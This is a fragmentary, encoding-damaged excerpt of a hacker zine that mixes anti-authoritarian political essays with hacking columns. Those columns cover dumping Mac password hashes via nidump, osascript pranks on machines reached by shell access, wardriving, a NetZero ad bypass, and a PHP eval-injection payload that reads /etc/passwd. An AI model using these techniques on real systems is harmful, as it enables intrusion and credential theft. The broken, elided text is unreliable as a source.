...
meetings, libraries, bookstores, newstands, etc. Remember, youÆre a part of
...
Email(canÆt always respond - but we do read!)
...
printed, weÆll send you a free zine! Send
...
past year weÆve experienced so much more with the development
of the IRC server, user-submitted articles and
resources, forums, and the internal staff structure. WeÆve
...
merely keeping up with the latest tech news, weÆre going
to be discussing the practical usage of hacking skills as
a means to fi ght for social justice. Considering todayÆs
political climate, it is becoming increasingly imperative
that we tune in to the world around us, to take a stance,
and give a fuck.

It is foolish and destructive to expand oneÆs hacking skills
...
that we willingly submit ourselves to the StateÆs oppression
...
make it clear of the establishmentÆs intent to
...
killing in privatizing IraqÆs oil resources(Halliburton), reconstruction
efforts(Bechtel), and otherwise allowing his
corporate buddies to loot Iraq for all itÆs worth. For weapons
...
destruction, weÆve built our own communities based on
...
ItÆs one attack, one struggle.
All of these injustices are not unrelated. These struggles
are linked, and everything is connected. ItÆs the system!
...
that we cannot trust figures of authority. ItÆs up to us to
organize on a cooperative, anti-authoritarian basis and
build our own free societies on the ashes of the old.

We donÆt have a lot of time left. Whether it be the madness
...
This isnÆt a call for pessimism, but rather the fantastic
...
out of line today, itÆs up to cowboys of the electronic age
...
of ideas, and donÆt patronize our readers by
...
information, resources, and the opportunity to fulfill oneÆs
...
to mindless destructive black hatting. WeÆre building an
army so powerful we wonÆt need weapons. Our revolution
...
ôStrength in numbersö as they say. I was recently
told of one account in which the eCommerce site
ôEtoysö sued a smaller website, and floodnet community
member ôEtoyö, claiming that etoy simply
desired traffic from typos of the word ôEtoys.comö.
The members of the Electronic Disturbance Theatre
(The Originators of Floodnet) threatened to
hold a ôTwelve days of Christmasö strike to bring
etoys stock to zero. Needless to say, etoys backed
down, and even payed for etoyÆs court costs.
...
ôOnly art history still knows that the famed geniuses
...
take the place of the historic artist-engineers.ö -
Frederich Kittler
...
Information Awareness (now named æterrorist information
awarenessÆ) that watches our credit card
...
watch, your shoes, your and you wonÆt be able to
buy something more expensive than a snickers bar
that doesnÆt have an EPC chip. The European Union is
...
placement of these chips or itÆs use - products containing
...
have in our homes, and what weÆre carrying on us
...
WeÆre setting up a booth to distribute HTS
...
command: ænidump passwd .Æ DES-encrypted
...
boot into æSingle User ModeÆ, which is essentially
...
If youÆve got shell access, thereÆs all sorts of fun
things you can do. Personally, I like Mac OS XÆs
built-in speech engine used in conjunction with
osascript, a command line AppleScript interpreter.
Try executing this:

[local:~] xec96% osascript -e æsay ôyou are being
watchedöÆ
...
Since you have access to AppleScriptÆs entire array
of neato system functions, there are other fun
things to do as well.

ò Open browser to a specified website
[local:~] xec96% osascript -e æopen location
ôhttp://www.larrycarlson.com/the_endöÆ
ò Control iTunes and play music
[local:~] xec96% osascript -e ætell application
ôiTunesöÆ -e ænext trackÆ -e ôend tellö (also in place
of ænext trackÆ, try æprevious trackÆ, æpauseÆ, æplayÆ,
and æopen ôMacintosh HD:something.mp3öÆ)
ò Open all apps at once(essentially freezing)
...
the war on drugs, and the indoctrination of todayÆs
youth through the DARE program.

ôThe establishment continues to ignore the positive
...
ôWe arenÆt malicious, destructive, or have a loose
...
than the machinery of the state will ever have.ö
...
major website and leave some lame message like æI h4x0r3d 
j00! c0nik was here - get more secure!Æ If you are going to 
...
working on advancing the FTAA are seeking to create a ôfree-tradeö block to
...
that they constructed a massive ôanarchist-proofö fence surrounding a large
...
amerikaÆs poorest large urban center, into a complete police state to protect
these scumbags?
...
group of ôhard-core anarchistsö come to destroy everything in the city and
...
police spin. The whole idea of ôanarchists causing chaosö is actually
a fabricated historical argument, used since the 1800Æs by the state and the
...
crowd. As the elderly, workers, students, and immigrants who couldnÆt get
...
surround the large group but couldnÆt because of itÆs
quickness. At the end of the day, there were about 50
arrests. Later that night word got out that a ôFTAA-liteö
...
and pay them money because the law was ôunfairö.
...
idea that ôbusiness has a right to make a profitö. Put
...
process is undemocratic, with secret meetings and ôfast
track legislationö that prevents congress from ratifying
trade agreements.
...
plans, such as Plan Puebla Panama. PPPÆs aim is to
...
were dispensed-some of which disrupted the meetingÆs
...
would ôprovide for the common defense by requiring that
...
and homeland security, and for other purposes,ö.
...
out anytime soon. BushÆs perpetual æwar against terrorismÆ
...
Bush out of office we will still be ôstaying the courseö in
...
Act: donÆt be surprised if they bring back the draft
...
ItÆs time to stand up and fight back. Extreme times call
...
loss as to what to write about as far as ôBugs in
the Wildö go. I mean come on, there are just so
...
Before I begin the actual ômeat and potatoesö of
the column, IÆd like to take a minute to introduce
...
ôBug in the Wildö. This bug has been around for
sometime, it is I think a well known exploit dealing
with the way some ôShopping cartsö at sites
...
to a level on HackThisSite.org. IÆll not tell which.

We all know Microsoft is a buggy OS. We all have
had at one time or another the dread ôBlue Screen
of Deathö lovingly referred to as the B.S.o.D.
There exists many vulnerabilities in the OS itself
and also the applications it comes with. IÆll use
...
you want. For this one IÆll include proof of concept
code. By using the tag &lt;a href=öwww.snap.
...
if www.HackThisSite.org has been put up in itÆs
...
you get caught, remember these words: ôDrop not
the soapö!
...
Source community, boasting it as ôthe way of the futureö,
...
is that Microsoft, one of the worldÆs leading OS manufacturer
and developer, had arranged to have another corporation
fund SCO in its attacks.

(1) ôFor months, rumors have swirled around the Web alleging
that Microsoft helped fi nance a small Utah software
companyÆs suit against IBM and two corporations that use
...
which made a $50 million investment in SCO last October.ö
This excerpt is taken from Business Week online. Further
in the article Lawrence Goldfarb is quoted, ôneither Chairman
William Gates nor CEO Steve Ballmer were among
the people from Microsoft who approached him.ö
...
IBM had allegedly moved. As of todayÆs date no further
...
plugged it in to the phone line, and opened up AOL (yes, itÆs AOL, but
damn, they have dial-up numbers everywhere. ThatÆs all I use it for. I
swear.) After connecting at 28800bps, I opened up my AOL mailbox
that hadnÆt been used in 3 years and cleared the 1,000+ spam messages
...
line. I said to myself, ôThereÆs got to be a faster way to do this.ö I remembered
...
young, and didnÆt really care either way. So, I grabbed my iBook, and
set out into the town to fi nd wireless freedom.

Once I manually found a wireless access point, I used that access
point to download a Mac-based ôstumblingö program, called iStumbler.
ItÆs not the only one out there, but it suits my needs the best. The
main ones for Mac are iStumbler, MacStumbler, and KisMAC, but itÆs
really just a matter of personal preference as to which one to use.
Once youÆve got yourself this software, you can drive (or walk, for that
...
waveguide, more commonly known as a ôcantennaö, because of its
quality and price. I built my cantenna with about $20 in parts and a
$3 can of chili, and it runs circles around my iBookÆs built-in antenna.
...
ThereÆre a number of websites out there devoted to wardriving and
with detailed instructions on building a cantenna, so Google around a
bit so I donÆt have to explain it here. All of the Mac, and most of the PC
...
Once youÆve got yourself a wireless notebook and all the gear you
...
whatÆs there. Passive wardriving should have no legal implications,
but the legality of active wardriving, especially depending upon your
defi nition of ôactiveö, is fairly unclear in most states. ItÆs your responsibility
...
Probably the fi rst comment youÆll have is ôsomething like
that will never happen at my schoolö. At least thatÆs what
...
about_ something. If itÆs just æfor the hell of itÆ, you should
...
DonÆt be afraid to go up to total strangers in a friendly way
and start sharing all these personal experiences. Reach
out to people of different cultural backgrounds. DonÆt let
...
school, itÆs time to release some publications. Consider
...
hype it up! Make it the topic of everyoneÆs discussion. Tell
everyone you see - even people you donÆt know. Do not
be afraid to talk to people you donÆt know - get used to
...
Have ideas for activities ready. DonÆt be afraid of creating
a ruckus - but everything you do must have an obvious
purpose. Keep things light-hearted and energetic. DonÆt
...
the power that be. And thereÆs room to grow.

YouÆre probably wondering why this guide appeared in
this magazine. ItÆs not about hacking(computers, that is).
...
$body = preg_replace(ô/\[b\](.*)\[\/b\]/siö,ö&lt;b>\\1&lt;/b>ö,$body);
$body = preg_replace(ô/\[i\](.*)\[\/b\]/siö,ö&lt;i>\\1&lt;/i>ö,$body);
$body = preg_replace(ô/\[u\](.*)\[\/u\]/siö,ö&lt;u>\\1&lt;/u>ö,$body);
$body = preg_replace(ô/\[img\](.*)\[\/img\]/siö,öÆ&lt;img src=\öÆ.str_
replace(æ æ,Æ%20Æ,Æ\\1Æ).Æ\ö>ö,$body);
$body = preg_replace(ô/\[url\](.*)\[\/url\]/sieö,öÆ&lt;a href=\öÆ.str_replace(æ
æ,Æ%20Æ,Æ\\1Æ).Æ\ö>\\1&lt;/a>ö,$body);
$body = preg_replace(ô/\[url=(.*)\](.*)\[\/url\]/sieö,öÆ&lt;a href=\öÆ.str_replace(æ
æ,Æ%20Æ,Æ\\1Æ).Æ\ö>\\2&lt;/a>ö,$body);
...
Then becomes æ&lt;img src=öÆ.str_replace(æ æ,Æ%20Æ,Æhttp://somesite.com/img.gifÆ).Æö>Æ

This then gets put through eval:
eval(æ&lt;img src=öÆ.str_replace(æ æ,Æ%20Æ,Æhttp://somesite.com/img.gifÆ).Æö>Æ)

How can we exploit it?, how about leaving the quote marks, then inserting file_get_contents(æ/etc/passwdÆ)
[img]http://somesite.com/img.gifÆ.fi le_get_contents(æ/etc/passwdÆ).Æ[img]

This then becomes:
eval(æ&lt;img src=öÆ.str_replace(æ æ,Æ%20Æ,Æhttp://somesite.com/img.gifÆ.fi le_get_contents(æ/
etc/passwdÆ).ÆÆ).Æö>Æ)
...
Bypassing NetzeroÆs Ad Banner by plastek
...
ads lags your connection. This really isnÆt that bad
...
you do it yourself. Sooner or later IÆll write a program
to do it.
...
were just taking up space? Well actually DLLÆs are
very important.
...
were made before Windows 95 was anyway. ThatÆs
where you go wrong, and thatÆs where DLLÆs come
in. As soon as you start up one of the programs, you
notice the title bar is different. ItÆs a Windows 95 title
bar, with an icon next to the name of the program,
and an ôxö button to close the program next to the
...
and build a new window, how to design it etcÆ. The
...
ænet.dllÆ. This is so when you have to move the file,
you wonÆt have to go looking around for a place to
put it. This is only done to speed up things, because
timing in this exploit is an important factor.

**Note: It isnÆt important where you move ænet.dllÆ, as
...
Click æconnectÆ and wait for your modem to dial and
...
switch back to Windows Explorer and move the ænet.
dllÆ file to another directory. The connection will complete.
At this point you would expect your browser
to open and for the banner to pop up. But nothing
happens. DonÆt worry, the connection is fine, and you
wonÆt get booted off. You have just fooled the banner
program. When youÆre done using the Internet,
...
on that. After youÆve signed off, move ænet.dllÆ back to
C:\Program Files\NetZero\bin

How This Exploit Works
Obviously, the important part of this exploit is the file
ænet.dllÆ. The NetZero start up program needs to access
this file, thatÆs why you have to move it back
when youÆre done. The banner program needs to
access this file too. If it canÆt find the file, the program
just doesnÆt start. Strangley enough, it doesnÆt
...
ôthey violated copyright lawö. This was shown to
...
ôDieboldÆs blanket cease-and-desist notices are a
blatant abuse of copyright law,ö said [Electronic
Frontier Foundation] Staff Attorney Wendy
Seltzer. ôPublication of the Diebold documents
...
secrets which would hurt ôprofitö. A closed
...
scandal has opened many peopleÆs eyes to the
